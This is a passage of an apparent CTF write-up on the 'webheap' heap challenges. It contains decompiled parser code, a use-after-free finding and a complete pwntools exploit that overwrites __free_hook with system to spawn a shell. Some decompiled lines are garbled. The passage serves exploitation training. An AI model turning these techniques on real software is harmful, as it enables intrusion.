buf; <span class="comment">// [rsp+17h] [rbp-29h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+18h] [rbp-28h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 i; <span class="comment">// [rsp+20h] [rbp-20h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Packet length: &quot;</span>);</span><br><span class="line">  <span class="built_in">std</span>::istream::operator&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cin</span>, &amp;v5);</span><br><span class="line">  <span class="keyword">if</span> ( v5 &gt; <span class="number">0x1000</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;stcd::<span class="built_in">cout</span>, <span class="string">&quot;The packet is too large&quot;</span>);</span><br><span class="line">    <span class="built_in">std</span>::ostream::operator&lt;&lt;(v1, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Content: &quot;</span>);</span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="type">char</span>&gt;::allocator(&amp;buf);</span><br><span class="line">  <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="type">char</span>&gt;&gt;::basic_string(a1, v5, <span class="number">0LL</span>, &amp;buf);</span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="type">char</span>&gt;::~allocator(&amp;buf);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0LL</span>; i &lt; v5; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    read(<span class="number">0</span>, &amp;buf, <span class="number">1uLL</span>);</span><br><span class="line">    v2 = buf;</span><br><span class="line">    *(_BYTE *)<span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="type">char</span>&gt;&gt;::operator[](a1, i) = v2;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> a1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li><p>The second parameter is to accept and process the data sent, but the function here is very complicated, repeat the test and send, and then meet many conditions, it is recommended to combine dynamic debugging, because it is very complicated without dynamic debugging, I started There is no dynamic debugging, which leads to hard reading. The amount of code is very complicated. It is not recommended to hard reading. Here are the main functions to process data.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_44E7</span><span class="params">(__int64 a1, __int64 opcode, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v5; <span class="comment">// [rsp+22h] [rbp-Eh] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v6; <span class="comment">// [rsp+23h] [rbp-Dh]</span></span><br><span class="line">  <span class="type">char</span> v7[<span class="number">4</span>]; <span class="comment">// [rsp+24h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v8; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  readOpcode1((__int64)v7, (<span class="built_in">std</span>::istream *)a3, &amp;v5);c</span><br><span class="line">  <span class="title function_">if</span> <span class="params">( (<span class="type">unsigned</span> __int8)sub_2468((__int64)v7) != <span class="number">1</span> )</span></span><br><span class="line">  &#123;</span><br><span class="line">    sub_2442(a1, (__int64)v7);</span><br><span class="line">  &#125;</span><br><span class="line">  elsec</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = v5;</span><br><span class="line">    <span class="keyword">if</span> ( sub_3415(v5) )                         <span class="comment">// v5ä¸º0xB9</span></span><br><span class="line">      sub_442A(a1, v6, opcode, a3);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      set_error(a1, <span class="number">1u</span>);                        </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> a1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> __fastcall <span class="title function_">sub_3415</span><span class="params">(<span class="type">char</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> a1 == (<span class="type">char</span>)<span class="number">0xB9</span>;   Check that the byte of the first packet must be <span class="number">0xB9</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_442A</span><span class="params">(__int64 a1, __int64 a2, __int64 opcode, __int64 a4)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v7[<span class="number">4</span>]; <span class="comment">// [rsp+2Ch] [rbp-14h] BYREF</span></span><br><span class="line">  __int64 v8[<span class="number">2</span>]; <span class="comment">// [rsp+30h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v8[<span class="number">1</span>] = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v8[<span class="number">0</span>] = <span class="number">0LL</span>;</span><br><span class="line">  readOpcode2((__int64)v7, (__int64)v8, (<span class="built_in">std</span>::istream *)a4);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)sub_2468((__int64)v7) != <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_2442(a1, (__int64)v7);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( v8[<span class="number">0</span>] == <span class="number">5</span> )c</span><br><span class="line">  &#123;</span><br><span class="line">    sub_4397(a1, opcode, a4);   <span class="comment">//å†æ¬¡å‘é€å¿…é¡»ç¬¬äºŒä¸ªæ•°æ®è¦ä¸º5</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    set_error(a1, <span class="number">5u</span>);                         </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> a1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">_DWORD *__fastcall <span class="title function_">chuanschuli</span><span class="params">(_DWORD *a1, <span class="type">unsigned</span> __int8 a2, _QWORD *a3, __int64 a4)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">switch</span> ( a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x80</span>u:</span><br><span class="line">      sub_3427(a1, a3, a4);                     <span class="comment">// 1bytes</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x81</span>:</span><br><span class="line">      sub_34D0(a1, a3, a4);                     <span class="comment">// 2bytes</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x82</span>:</span><br><span class="line">      sub_357B(a1, a3, a4);                     <span class="comment">// 4bytes</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x83</span>:</span><br><span class="line">      sub_3625(a1, a3, a4);                     <span class="comment">// 5bytes</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      *a3 = a2;</span><br><span class="line">      *a1 = <span class="number">0</span>;</span><br><span class="line">      no_error((__int64)a1);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> a1;  This is mainly to determine the data determined by the transmission parameters</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Probably the process has been reversed, and the next step is to combine gdb-pwndbg to carry out the next step. It is extremely complicated here, and debugging has been adjusted all morning.</p><p>After all the parameters are constructed, the next step is to directly find holes to play</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_18A3</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> op; <span class="comment">// [rsp+14h] [rbp-4Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 idx; <span class="comment">// [rsp+18h] [rbp-48h]</span></span><br><span class="line">  <span class="type">char</span> v4[<span class="number">40</span>]; <span class="comment">// [rsp+30h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+58h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  op = *(_DWORD *)a1;</span><br><span class="line">  idx = *(_QWORD *)(a1 + <span class="number">8</span>);</span><br><span class="line">  <span class="keyword">if</span> ( *(_DWORD *)a1 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    show(idx);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( op &gt; <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( op == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      del(idx);                                 <span class="comment">// uaf</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( op == <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="type">char</span>&gt;&gt;::basic_string(v4, a1 + <span class="number">24</span>);</span><br><span class="line">      edit(idx, (__int64)v4);</span><br><span class="line">      <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="type">char</span>&gt;&gt;::~basic_string(v4);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( !op )</span><br><span class="line">  &#123;</span><br><span class="line">    add(idx, *(_QWORD *)(a1 + <span class="number">0x10</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>In fact, this heap vulnerability is in del, del:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">sub_17EF</span><span class="params">(<span class="type">unsigned</span> __int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( a1 &gt; <span class="number">0xF</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  <span class="built_in">free</span>((<span class="type">void</span> *)ptr_list[a1]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>After discovering the UAF, you can directly follow the conventional ideas. You can find a way to write the parameters of the functions such as add, show, and edit through dynamic debugging and reverse analysis. In fact, the previous reverse process takes a lot of time, but the reverse understands the parameters and finds it. The hole was punched directly, it took 15 minutes</p><p>expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&quot;./webheap&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;webheap&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;/home/roo/Desktop/tools/glibc-all-in-one-master/libs/2.27-3ubuntu1.5_amd64/libc.so.6&quot;</span>)</span><br><span class="line">se      = <span class="keyword">lambda</span> data               :p.send(data) </span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)</span><br><span class="line">sea     = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">rc      = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :p.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">info_addr = <span class="keyword">lambda</span> tag, addr        :p.info(tag + <span class="string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(addr))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,size,content=<span class="string">&#x27;jsjjs&#x27;</span></span>):</span><br><span class="line">    payload=<span class="string">b&#x27;\xB9\x80\x05&#x27;</span></span><br><span class="line">    payload+=<span class="string">b&#x27;\x84&#x27;</span>+p8(<span class="number">0</span>)</span><br><span class="line">    payload+=<span class="string">b&#x27;\x80&#x27;</span>+p8(idx)</span><br><span class="line">    payload+=<span class="string">b&#x27;\x83&#x27;</span>+p64(size)</span><br><span class="line">    payload+=<span class="string">b&#x27;\xbd\x83&#x27;</span>+p64(<span class="built_in">len</span>(content))</span><br><span class="line">    payload+=<span class="built_in">str</span>(content)</span><br><span class="line">    payload+=<span class="string">b&#x27;\x80&#x27;</span>+p8(<span class="number">0</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;th: &quot;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line">    p.sendafter(<span class="string">&quot;Content: &quot;</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    payload=<span class="string">b&#x27;\xB9\x80\x05&#x27;</span></span><br><span class="line">    payload+=<span class="string">b&#x27;\x84&#x27;</span>+p8(<span class="number">2</span>)</span><br><span class="line">    payload+=<span class="string">b&#x27;\x80&#x27;</span>+p8(idx)</span><br><span class="line">    payload+=<span class="string">b&#x27;\x80&#x27;</span>+p8(<span class="number">0</span>)</span><br><span class="line">    payload+=<span class="string">b&#x27;\xbd\x80&#x27;</span>+p8(<span class="number">1</span>)</span><br><span class="line">    payload+=<span class="string">b&#x27;\x80&#x27;</span>+p8(<span class="number">0</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;th: &quot;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line">    p.sendafter(<span class="string">&quot;Content: &quot;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    payload2=<span class="string">b&#x27;\xB9\x80\x05&#x27;</span></span><br><span class="line">    payload2+=<span class="string">b&#x27;\x84&#x27;</span>+p8(<span class="number">1</span>)</span><br><span class="line">    payload2+=<span class="string">b&#x27;\x80&#x27;</span>+p8(idx)</span><br><span class="line">    payload2+=<span class="string">b&#x27;\x80&#x27;</span>+p8(<span class="number">0</span>)</span><br><span class="line">    payload2+=<span class="string">b&#x27;\xbd\x80&#x27;</span>+p8(<span class="number">1</span>)</span><br><span class="line">    payload2+=<span class="string">b&#x27;\x80&#x27;</span>+p8(<span class="number">0</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;th: &quot;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(payload2)))</span><br><span class="line">    p.sendafter(<span class="string">&quot;Content: &quot;</span>,payload2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">    payload=<span class="string">b&#x27;\xB9\x80\x05&#x27;</span></span><br><span class="line">    payload+=<span class="string">b&#x27;\x84&#x27;</span>+p8(<span class="number">3</span>)</span><br><span class="line">    payload+=<span class="string">b&#x27;\x80&#x27;</span>+p8(idx)</span><br><span class="line">    payload+=<span class="string">b&#x27;\x80&#x27;</span>+p8(<span class="number">0</span>)</span><br><span class="line">    payload+=<span class="string">b&#x27;\xbd\x83&#x27;</span>+p64(<span class="built_in">len</span>(content))</span><br><span class="line">    payload+=content</span><br><span class="line">    payload+=<span class="string">b&#x27;\x80&#x27;</span>+p8(<span class="number">0</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;th: &quot;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line">    p.sendafter(<span class="string">&quot;Content: &quot;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    add(i,<span class="number">0x400</span>,<span class="string">&#x27;aaaaa&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(i)</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(i,<span class="number">0x400</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x300</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">raw_input()</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">libc_base=u64(p.recvline()[-<span class="number">7</span>:-<span class="number">1</span>].ljust(<span class="number">0x8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x3ec090</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">free_hook=libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x4f2a5 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rsp &amp; 0xf == 0</span></span><br><span class="line"><span class="string">  rcx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4f302 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x40] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x10a2fc execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">rce1=libc_base+<span class="number">0x4f2a5</span></span><br><span class="line">rce2=libc_base+<span class="number">0x4f302</span></span><br><span class="line">rce3=libc_base+<span class="number">0x10a2fc</span></span><br><span class="line"><span class="comment">#for i in range(7):</span></span><br><span class="line"><span class="comment">#    delete(i)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#edit(6,p64(free_hook-8))</span></span><br><span class="line"><span class="comment">#add(7,0x400,&#x27;a&#x27;)</span></span><br><span class="line"><span class="comment">#add(5,0x400,p64(rce1))</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#edit(5,p64(rce1))</span></span><br><span class="line"><span class="comment">#raw_input()</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(free_hook)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(i,<span class="number">0x80</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(i)</span><br><span class="line">edit(<span class="number">6</span>,p64(free_hook))</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x80</span>)</span><br><span class="line">edit(<span class="number">11</span>,p64(system))</span><br><span class="line">edit(<span class="number">10</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">delete(<span class="number">10</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="webheap-revenge"><a href="#webheap-revenge" class="headerlink" title="webheap_revenge:"></a>webheap_revenge:</h2><p>This question is the same as the previous one. You can even directly use the above script function parameters to type it. I heard that it is an upgraded version of the previous question, but I did not see any upgrades. After passing the test, there is any heap overflow, which is better than the previous one. A little more complicated. It is when the heap is laid out, the layout is too messy, which leads to a period of self-closing, and then after re-layout, it can be played, directly hit freehook as system, and then rce</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span 